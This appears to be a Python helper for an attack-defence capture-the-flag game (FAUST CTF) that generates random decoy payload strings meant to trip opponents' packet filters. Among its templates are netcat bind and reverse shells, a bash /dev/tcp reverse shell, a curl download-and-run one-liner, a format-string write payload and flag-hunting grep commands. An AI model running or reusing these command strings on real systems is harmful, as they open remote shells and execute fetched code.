import random
import os
import base64
import secrets


def generate_message():
    "returns a string that hopefully triggers some packet filtering"

    return random.choice([
        "%15${}d%44$hhn%15${}d%45hhn".format(random.randint(5, 255), random.randint(5, 255)),
        os.urandom(random.randint(4, 128)).hex(),
	base64.b64encode(os.urandom(random.randint(4, 128))).decode(),
  	'A' * random.randint(4, 16),
	'B' * random.randint(4, 16),
        "\x90" * random.randint(4, 16),
	'Never gonna give you up, never gonna let you down',
        '/bin/sh -c "/bin/{} -l -p {} -e /bin/sh"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535)),
        '/bin/sh -c "/bin/{} -e /bin/sh fd66:666:{:x}:ffff::{:x} {}"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535), random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
        '/bin/bash -i >& /dev/tcp/ fd66:666:{:x}:ffff::{:x}/{} 0>&1'.format(random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
        "find / -type f -exec grep 'FAUST_' {} \\;",
        "grep -R . -e 'FAUST'",
        "curl http://[fd66:666:{:x}:ffff::{:x}]:{}/{} -o /tmp/foo && ./foo && rm /tmp/foo".format(random.randint(0,255), random.randint(0,255), random.randint(1024, 65535), secrets.token_hex(8)),
    ])
